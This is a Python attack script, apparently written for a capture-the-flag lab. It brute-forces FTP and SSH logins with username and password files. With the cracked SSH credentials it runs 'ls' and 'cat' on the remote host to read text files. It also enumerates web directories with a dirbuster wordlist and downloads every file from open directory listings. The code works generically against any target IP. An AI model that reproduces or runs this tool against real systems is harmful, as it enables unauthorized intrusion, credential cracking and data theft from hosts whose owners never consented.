from operator import ne
import paramiko
import ftplib
import time
import socket
import requests
import logging
from logging import NullHandler
from bs4 import BeautifulSoup
import shutil
import os

def brute_force_FTP(targetIP: str) -> None:
    """Gets ip address and tries to login to FTP server 
    users and passwords from file
    uses module ftplib.FPT()
    Args:
        targetIP (str): ip address
    Returns: FTP_cerdentials (dict) : key: targetIP, value: list of lists; each list consists of pair user and password
    """
    print(f"Calling brute_force_FTP on {targetIP}")

    # files: users and passwords operations
    
    password_file = "passwd.txt"
    users_file = "users.txt"
    users = open(users_file)
    passwds = open(password_file)
    users_list = users.readlines()
    pass_list = passwds.readlines()
    users.close()
    passwds.close()

    ftpServer = ftplib.FTP()
    FTP_credentials = {}
    user_pass = []

    for user in users_list:
        user = user.strip()
        for passwd in pass_list:
            passwd = passwd.strip()
            try:
                print(f"Trying: {user}: {passwd}")
                ftpServer.connect(targetIP, 21, timeout=1000)
                ftpServer.login(user, passwd)
                print(f"[+] Found combo for FTP:\n\tHOSTNAME: {targetIP}\n\tUSERNAME: {user}\n\tPASSWORD: {passwd}")
                user_pass.append([user, passwd])
                FTP_credentials[targetIP] = user_pass
                ftpServer.close()
            except Exception as error:
                print(f"[!] {error}")
    return FTP_credentials

def try_connect(hostname, username, password, port=22) -> dict:
    """Tries to connect on SSH port using arguments
    Args:
        hostname (str): hostname
        username (str): username
        password (str): password
        port (int, optional): port number Defaults to 22
    Returns:
        dict: dict consists of three parameters: ip, user and password if those are valid otherwise returns False:bool
    """
    logging.getLogger('paramiko.transport').addHandler(NullHandler())
    # initialize SSH client
    client = paramiko.SSHClient()
    # add to know hosts
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username, password=password, timeout=10, port=port)
    except socket.timeout:
        # this is when host is unreachable
        print(f"[!] Host: {hostname} is unreachable, timed out.")
        return False
    except paramiko.AuthenticationException:
        print(f"[!] Invalid credentials for {username}:{password}")
        return False
    except paramiko.SSHException:
        print(f"[*] Quota exceeded, retrying with delay...")
        # sleep for ten seconds
        time.sleep(10)
        return try_connect(hostname, username, password, port)
    else:
        # connection was established successfully
        print(f"[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}")
        return {'hostname' : hostname, 'username' : username, 'password' : password}

def brute_force_SSH(targetIP: str) -> dict:
    """Gets ip address and tries to login to SSH server 
    users and passwords from file
    uses module paramiko.SSHClient()
    Args:
        targetIP (str): ip address    
    Returns: SSH_cerdentials (dict) : key: targetIP, value: list of lists; each list consists of pair user and password
    """
    print(f"Calling: brute_force_SSH on {targetIP}")

    # files: users and passwords operations
    
    password_file = "passwd.txt"
    passwds = open(password_file)
    pass_list = passwds.readlines()
    passwds.close()

    users_file = "users.txt"
    users = open(users_file)
    users_list = users.readlines()
    users.close()

    SSH_credentials = {}
    user_pass = []

    for user in users_list:
        user = user.strip()
        for passwd in pass_list:
            passwd = passwd.strip()
            if try_connect(targetIP, user,passwd):
                user_pass.append([user,passwd])
                break
        
    SSH_credentials[targetIP] = user_pass
    return SSH_credentials # this dict can be used in another function to log in and manipulate on remote system

def read_remote_files(SSH_credentials: dict) -> None:
    """Reads all txt files. From txt files print content
    Args: SSH_credentials (dict): key: ip address, value: list of lists consists of pair: user/pass
    """
    # initialize SSH client
    sshserver = paramiko.SSHClient()
    # add to know hosts
    sshserver.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    sshserver.load_system_host_keys()
    for ip, user_pass in SSH_credentials.items():
        for user, passwd in user_pass:
            # print (ip, user, passwd)
            try:
                sshserver.connect(hostname=ip, username=user, password=passwd, timeout=5)
                ls_command = 'ls -a'
                stdin, stdout, stderr = sshserver.exec_command(ls_command)
                list_of_files = stdout.readlines()
                # print(list_of_files)
                for file in list_of_files:
                    file = file.replace('\n','')
                    if  '.txt' in file:
                        cat_command = 'cat ' + file
                        stdin, stdout, stderr = sshserver.exec_command(cat_command)
                        print(f"[+] Host:{ip} User:{user} flaga: {stdout.readlines()[0].strip()} w pliku: {file}")
                sshserver.close()
            except socket.timeout:
                # this is when host is unreachable
                print(f"[!] Host: {ip} is unreachable, timed out.")

# ========= http attack ===========

def make_links(url:str) -> list:
    """From ip address and words from dictionary on linux kali disc makes list of links (ip/path) to check
    Args:
        url (str): ip address
    Returns:
        list: list of links to check
    """
    links = []
    # WORDLIST = "/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt"
    WORDLIST = "/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-very-small.txt"
    with open(WORDLIST, errors='ignore') as stream:
        directories = stream.read().split("\n")
    for directory in directories:
        if not directory.startswith('#') and not directory.startswith('?') and directory !='':
            link = url + '/' + directory
            links.append(link)
    # print(links)
    return links # list of links to check

def check_http_response(links: list) -> list:
    """Get list of links and using requests module checks whether gets return code 200 or not.
    Args:
        links (list): list of links to check
    Returns:
        list: list of proper links, where status code was 200
    """
    links_200_ok = []
    for link in links:
        response = requests.get(link)
        if response.ok: # response = 200
            links_200_ok.append(link)    
    return links_200_ok

def update_links(links: list) -> list:
    """Adds next level files to list: links_200_ok
    Args:
        links (list): links_200_ok
    Returns:
        list: complet list of proper links
    """
    links_200_ok = check_http_response(links)
    for link in links_200_ok:
        next_level = make_links(link)
        next_level_links_200_ok = check_http_response(next_level)
        links_200_ok.extend(next_level_links_200_ok)
    return links_200_ok

def get_page(link: str) -> dict:
    """From page under link gets list of files if page starts with title: "Index of"
    Args:
        link (str): full link ip/path
    Returns:
        dict: key: link, value: list of files on the page
    """
    list_of_file = []
    response = requests.get(link).text
    soup = BeautifulSoup(response, "html.parser")

    title = str(soup.findAll("title"))
    if 'Index of' in str(title):
        for res in soup.findAll("a", {'href': True}): # szukamy odnosnikow
            file = res.get('href') # pobieramy odnosnik
            if file[-1] != "/" and file[0] != "?":
                list_of_file.append(file)
        return {'link': link,  'files': list_of_file}
    else:
        return {}

def get_file(link_files: dict) -> None:
    """Function gets dict which consists of link and list of files and downloads them on local disc
    It writes them to 'ip_from_link' directory
    Args:
        link_files (dict): key: link, value: list of filenames with extension
    """
    if link_files['link']:
        link = link_files['link']
        files = link_files['files']
        dir_name = "-".join(link.split("/")[3:]) # directory name
        dir_main = link.split("/")[2] # ip address
        if not os.path.isdir(dir_main):
            os.mkdir(dir_main)
        os.chdir(dir_main)
        # print(dir_name)
        if dir_name != '':
            shutil.rmtree(dir_name, ignore_errors=True)
            os.mkdir(dir_name)
        else:
            shutil.rmtree("root", ignore_errors=True)
            os.mkdir("root")
        for file in files:
            response = requests.get(link + "/" + file)
            open(dir_name + "/" + file, "wb").write(response.content)
            print("[+] File:", file, "written in dir:", dir_name)
        os.chdir('..')

def attack_http(targetIP:str) -> dict:
    """Collects other function to carry out an attack
    Args:
        targetIP (str): ip address
    Returns:
        file_list (dict): key: link, value: list of files on the page
    """
    print("Calling HTTP attack ...")
    links_to_check = make_links("http://" + targetIP)
    links_200_ok = update_links(links_to_check)
    for link in links_200_ok:
        file_list = get_page(link)
        get_file(file_list)
    return file_list

def brute_force(hosts_ports_list: dict):
    for ip_addr, ports in hosts_ports_list.items():
        for port in ports:
            if port == 21:
                print(brute_force_FTP(ip_addr))
            if port == 22:
                SSH_cred = brute_force_SSH(ip_addr)
                if SSH_cred:
                    read_remote_files(SSH_cred)
            if port == 80:
                attack_http(ip_addr)
                print("Success!")
                

# how can i call separate functions:
# param = {'192.168.10.100': (21,22,80)}
# brute_force(param)

# single FTP brute force test
# ip = '192.168.10.100'
# # brute_force_FTP(ip)

# single SSH brute force test
# print(brute_force_SSH(ip))

#singler read remote files test
# SSH_cred = {'192.168.10.100': [['root','666'],['uranus','butterfly']]}
# read_remote_files(SSH_cred)

# single HTTP attack
# attack_http(ip)

